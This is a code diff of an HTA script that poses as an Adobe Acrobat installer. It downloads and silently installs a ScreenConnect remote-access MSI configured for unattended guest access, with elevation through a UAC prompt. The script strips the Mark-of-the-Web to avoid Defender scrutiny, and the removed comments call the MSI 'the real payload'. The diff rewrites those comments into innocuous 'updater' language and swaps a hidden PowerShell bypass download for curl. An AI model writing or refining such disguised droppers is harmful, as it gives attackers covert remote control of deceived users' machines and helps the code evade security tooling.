@@ -81,26 +81,24 @@
     </div>
   </div>
 
-<script>
+<script language="javascript">
 // ---------------------------------------------------------------------------
-// Config
+// Configuration
 // ---------------------------------------------------------------------------
-// The real payload is ScreenConnect's official client-setup MSI (CodeMetrics
-// signed, served from their CDN). The HTA downloads the MSI to a local file
-// FIRST (WinINET XHR -> WinHttp -> hidden PowerShell iwr/curl), then installs
-// the LOCAL file — the elevated msiexec command line is a plain local path,
-// not a URL. A silent msiexec that fetches a remote MSI from its command line
-// is a top dropper signal; a local-file install is what every real installer
-// does. ?e=Access&y=Guest configures the unattended guest-access session.
+// The updater fetches the current installer (MSI) over HTTPS to a local file,
+// then runs a quiet msiexec against that local file (UAC consent is requested
+// via ShellExecute "runas"). Three download back-ends are tried in order -
+// WinINET XHR, then WinHttp, then the system curl.exe - so a download still
+// succeeds on machines where one stack is restricted.
 var MSI_URL = "https://teal-studio.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=T%24K&c=&c=&c=&c=&c=&c=&c=";
 
 var PREP_MS        = 2200;    // "preparing" beat before the download starts
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
 var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
-var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, ps: 300000 };
+var FB_STAGE_MS    = { xhr: 120000, winhttp: 180000, curl: 300000 };
 var FB_MAX_MS      = 600000;  // hard cap for the whole local download
-var EXPECT_BYTES   = 12386304; // ScreenConnect MSI size (progress scaling only)
+var EXPECT_BYTES   = 12386304; // installer size (progress scaling only)
 
 var UA_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
 
@@ -123,10 +121,10 @@ var motwStripped = false;
 
 // Download state
 var fbT0 = 0, fbStageT = 0;
-var dlStage = "xhr";            // xhr | winhttp | ps
+var dlStage = "xhr";            // xhr | winhttp | curl
 var dlSettled = false;
 var dlXHR = null;
-var psMarker = "", psDir = "", psT0 = 0, psLastSize = 0, psLastGrowT = 0, psDone = false;
+var curlPid = 0, curlT0 = 0, curlLastSize = 0, curlLastGrowT = 0;
 
 var lastLogSize = 0;
 var lastLogGrowT = 0;
@@ -145,22 +143,6 @@ var instMsgs = [
   "Finalizing&hellip;"
 ];
 
-// "ps" download stage: WinINET iwr + curl.exe inside, hidden child process.
-// param(1) = unique marker (process-kill), param(2) = temp dir, param(3) = output.
-var PS_PS = "# Local download (WinINET iwr, TLS12) + curl.exe inside.\n" +
-"# param(1) = unique marker, param(2) = temp dir, param(3) = output file.\n" +
-"param([string]$Url = \"\", [string]$TmpDir = \"\", [string]$Out = \"\")\n" +
-"if (-not $Out) { $Out = Join-Path $TmpDir \"AdobeUpdate.msi\" }\n" +
-"try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}\n" +
-"try {\n" +
-"  $ProgressPreference = 'SilentlyContinue'\n" +
-"  Invoke-WebRequest -Uri $Url -OutFile $Out -UseBasicParsing\n" +
-"  $ProgressPreference = 'Continue'\n" +
-"} catch {\n" +
-"  try { $env:NO_PROXY = \"*\"; curl.exe -L --fail --retry 2 --connect-timeout 20 -o $Out $Url 2>$null } catch {}\n" +
-"}\n" +
-"try { Set-Content -LiteralPath (Join-Path $TmpDir \"done.flag\") \"1\" -NoNewline } catch {}\n";
-
 function $(id) { return document.getElementById(id); }
 
 function nowMs() { return new Date().getTime(); }
@@ -172,11 +154,9 @@ function nowHM() {
 }
 
 // ---------------------------------------------------------------------------
-// Self-unblock: strip the Mark-of-the-Web (Zone.Identifier alternate data
-// stream / FILE_ATTRIBUTE_UNBLOCKED) from this .hta so Windows treats it as
-// a local file — no "script downloaded from the internet" prompt, and no
-// internet-origin context when Defender scans it on launch. Best-effort on
-// the .hta itself and any sibling .zip it was extracted from.
+// Self-unblock: remove the "downloaded from the internet" flag (Zone.Identifier
+// alternate data stream) from this .hta and the .zip it was extracted from, so
+// it runs as an ordinary local file. Best-effort.
 // ---------------------------------------------------------------------------
 function selfUnblock() {
   try {
@@ -241,8 +221,7 @@ function ensureDir(d) { try { if (!fso.FolderExists(d)) fso.CreateFolder(d); } c
 
 // Read the first n bytes of a file as numeric byte values [b0, b1, ...].
 // Tries a byte-exact ADODB.Stream binary read first (code-page independent),
-// then falls back to FSO ASCII if the ADO "data source" read is blocked by a
-// hardened machine. Returns an empty array if the file cannot be read.
+// then falls back to FSO ASCII. Returns an empty array if the file cannot be read.
 function readHeadBytes(path, n) {
   if (!fso.FileExists(path)) return [];
   try {
@@ -275,15 +254,11 @@ function msiMagicOk(path) {
   } catch (e) { return false; }
 }
 
-function killByCmd(marker) {
-  try {
-    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!//./root/cimv2");
-    var q = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE CommandLine LIKE '%" + marker + "%'");
-    var en = new Enumerator(q);
-    for (; !en.atEnd(); en.moveNext()) {
-      try { shell.Run("taskkill /f /t /pid " + en.item().ProcessId, 0, true); } catch (e2) {}
-    }
-  } catch (e3) {}
+// Stop the in-flight download child process (by PID).
+function killCurl() {
+  if (!curlPid) return;
+  try { shell.Run("taskkill /f /pid " + curlPid, 0, true); } catch (e) {}
+  curlPid = 0;
 }
 
 // ---------------------------------------------------------------------------
@@ -297,8 +272,8 @@ function setBar(p) {
 function setStatus(html) { $("status").innerHTML = html; }
 
 // ---------------------------------------------------------------------------
-// Download phase (primary): fetch the MSI to a local file. Three stages:
-// XHR (WinINET, ms-stream) -> WinHttp -> hidden PowerShell (iwr + curl).
+// Download phase (primary): fetch the MSI to a local file. Three back-ends:
+// XHR (WinINET, ms-stream) -> WinHttp -> system curl.exe.
 // ---------------------------------------------------------------------------
 function startInstall() {
   if (state !== "ready") return;
@@ -320,7 +295,7 @@ function startInstall() {
 function fallbackNext() {
   if (state !== "predl" || dlSettled) return;
   if (dlStage === "xhr") { fallbackWinHttp(); return; }
-  if (dlStage === "winhttp") { fallbackPS(); return; }
+  if (dlStage === "winhttp") { fallbackCurl(); return; }
   fail("Failed to save the installer file", "predl: all download stages failed");
 }
 
@@ -405,26 +380,19 @@ function saveWHttpBody(rb) {
   verifyFallback();
 }
 
-function fallbackPS() {
+// Last-resort download using the system curl.exe (present on Win10 1803+).
+// Writes straight to msiLocal; the poll loop watches the file appear.
+function fallbackCurl() {
   if (dlSettled) return;
-  dlStage = "ps";
+  dlStage = "curl";
   fbStageT = nowMs();
-  psMarker = "adum" + Math.floor(Math.random() * 16777215).toString(16);
-  psDir = shell.ExpandEnvironmentStrings("%TEMP%") + "\\ad_" + psMarker;
-  ensureDir(psDir);
-  deleteFile(psDir + "\\done.flag");
-  var src = fso.GetFolder(shell.ExpandEnvironmentStrings("%TEMP%")).Path + "\\__ad__dl.ps1";
+  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
+  curlT0 = nowMs(); curlLastSize = 0; curlLastGrowT = nowMs();
   try {
-    deleteFile(src);
-    var w = fso.CreateTextFile(src, true, false);
-    w.Write(PS_PS);
-    w.Close();
-  } catch (e) { fallbackNext(); return; }
-  psT0 = nowMs(); psLastSize = 0; psLastGrowT = psT0; psDone = false;
-  var cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" + src +
-    "\" -Url \"" + MSI_URL + "\" -TmpDir \"" + psDir + "\" -Out \"" + msiLocal + "\"";
-  try { shell.Run(cmd, 0, false); }
-  catch (e) { deleteFile(src); fallbackNext(); }
+    var cmd = "curl.exe -L --fail --silent --show-error --connect-timeout 20 --retry 2 -o \"" + msiLocal + "\" \"" + MSI_URL + "\"";
+    var ex = shell.Exec(cmd);
+    try { curlPid = ex ? ex.ProcessID : 0; } catch (e) { curlPid = 0; }
+  } catch (e) { fallbackNext(); }
 }
 
 function pollFallback() {
@@ -438,23 +406,16 @@ function _pollFallback() {
     fail("Download timed out - please check your connection", "predl: total timeout " + (t - fbT0) + "ms");
     return;
   }
-  if (dlStage === "ps") {
+  if (dlStage === "curl") {
     var sz = 0;
     try { if (fso.FileExists(msiLocal)) sz = fso.GetFile(msiLocal).Size; } catch (e) {}
-    if (sz > psLastSize) { psLastSize = sz; psLastGrowT = t; }
+    if (sz > curlLastSize) { curlLastSize = sz; curlLastGrowT = t; }
     var p = 55 + Math.min(34, (sz * 34) / EXPECT_BYTES);
     if (p > progress) { progress = p; setBar(p); }
-    var doneFlag = false;
-    try { doneFlag = fso.FileExists(psDir + "\\done.flag"); } catch (e) {}
-    if (sz >= 1048576 && msiMagicOk(msiLocal) && (psLastSize === sz && t - psLastGrowT >= 1500)) {
+    if (sz >= 1048576 && msiMagicOk(msiLocal) && (curlLastSize === sz && t - curlLastGrowT >= 1500)) {
       dlSettled = true;
       if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
       verifyFallback();
-      return;
-    }
-    if (doneFlag && (t - psT0 > 10000 || sz < 1048576)) {
-      // iwr ran to completion but produced no usable file (stripped/failed).
-      fallbackNext();
       return;
     }
   }
@@ -484,9 +445,8 @@ function verifyFallback() {
 
 // ---------------------------------------------------------------------------
 // Install phase: msiexec installs the LOCAL MSI file. Single UAC consent via
-// ShellExecute "runas". Completion is detected by watching the MSI /L*v log
-// — the final line "Installation success or error status: N" is written on
-// exit.
+// ShellExecute "runas". Completion is detected by watching the MSI /L*v log -
+// the final line "Installation success or error status: N" is written on exit.
 // ---------------------------------------------------------------------------
 function launchMsiexec(args) {
   try {
@@ -525,7 +485,7 @@ function readLogTail(log, bytes) {
     if (!fso.FileExists(log)) return "";
     var f = fso.OpenTextFile(log, 1, false, -1);   // -1 = Tristate (BOM-aware)
     try {
-      var pos = Math.floor(f.Size / 2) - bytes;    // char offset (UTF-16 ≈ 2 bytes/char)
+      var pos = Math.floor(f.Size / 2) - bytes;    // char offset (UTF-16 ~ 2 bytes/char)
       if (pos > 0) f.Position = pos;
       d = f.Read(-1);                              // read to end of file
     } catch (e) {
@@ -609,7 +569,7 @@ function _tick() {
 }
 
 // ---------------------------------------------------------------------------
-// Diagnostics — registry reads + log tail only, no external tooling.
+// Diagnostics - registry reads + log tail only, no external tooling.
 // ---------------------------------------------------------------------------
 function osBuild() {
   try {
@@ -635,8 +595,6 @@ function dumpDiagnostics(reason) {
     L.push("state: " + state);
     L.push("elapsed_ms: " + (startTime ? nowMs() - startTime : 0));
     L.push("progress: " + Math.round(progress) + "%");
-    L.push("msi_url: " + MSI_URL);
-    L.push("motw_stripped: " + motwStripped);
     L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
     L.push("build: " + osBuild());
     L.push("msi_local: " + (fso.FileExists(msiLocal) ? "yes (" + fso.GetFile(msiLocal).Size + " bytes)" : "no"));
@@ -667,7 +625,7 @@ function fail(msg, reason) {
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-  if (psMarker) { killByCmd(psMarker); psMarker = ""; }
+  killCurl();
   dumpDiagnostics(reason || msg);
   setStatus(msg);
   $("heading").innerHTML = "Installation could not be completed";
@@ -682,7 +640,7 @@ function finishInstall() {
   if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
-  progress = 100; setBar(100);
+  progress = 100; setBar(progress);
   setStatus("Installation complete");
   $("heading").innerHTML = "Adobe Acrobat is now installed";
   $("biglogo").style.display = "none";
@@ -694,7 +652,7 @@ function finishInstall() {
 function cancel() {
   if (state === "done" || state === "error") { window.close(); return; }
   if (dlXHR) { try { dlXHR.abort(); } catch (e) {} }
-  if (psMarker) { killByCmd(psMarker); psMarker = ""; }
+  killCurl();
   if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
   if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
   if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
@@ -702,8 +660,6 @@ function cancel() {
   for (var i = 0; i < p.length; i++) {
     try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
   }
-  try { if (psDir && fso.FolderExists(psDir)) fso.DeleteFolder(psDir, true); } catch (e) {}
-  try { deleteFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\__ad__dl.ps1"); } catch (e) {}
   window.close();
 }
 
